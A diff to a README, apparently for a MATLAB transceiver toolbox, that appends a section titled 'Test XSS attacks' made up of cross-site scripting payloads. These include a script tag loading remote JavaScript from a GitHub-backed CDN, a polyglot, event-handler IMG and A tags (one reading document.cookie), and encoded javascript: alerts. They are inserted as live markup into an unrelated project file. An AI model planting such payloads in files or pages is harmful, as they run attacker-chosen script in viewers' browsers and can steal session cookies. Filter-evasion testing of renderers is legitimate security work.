@@ -294,3 +294,34 @@ Adding this line to see if I can update from Git on MATLAB Desktop
 
 ### With neither
 <a href="http://swdownloads.analog.com/cse/toolboxes/trx/master/AnalogDevicesTransceiverToolbox_v20.2.1.mltbx"><img src="https://upload.wikimedia.org/wikipedia/commons/2/21/Matlab_Logo.png" data-canonical-src="https://upload.wikimedia.org/wikipedia/commons/2/21/Matlab_Logo.png"/></a>
+
+# Test XSS attacks
+### Basic XSS Test Without Filter Evasion
+<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>
+
+### XSS Locator (Polyglot)
+javascript:/*--></title></style></textarea></script></xmp>
+<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
+
+### Malformed A Tags
+\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
+
+### Malformed IMG Tags
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
+
+### Default SRC Tag to Get Past Filters that Check SRC Domain
+<IMG SRC=# onmouseover="alert('xxs')">
+
+### Default SRC Tag by Leaving it Empty
+<IMG SRC= onmouseover="alert('xxs')">
+
+### Default SRC Tag by Leaving it out Entirely
+<IMG onmouseover="alert('xxs')">
+
+### On Error Alert
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+
+IMG onerror and JavaScript Alert Encode
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+### fromCharCode
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
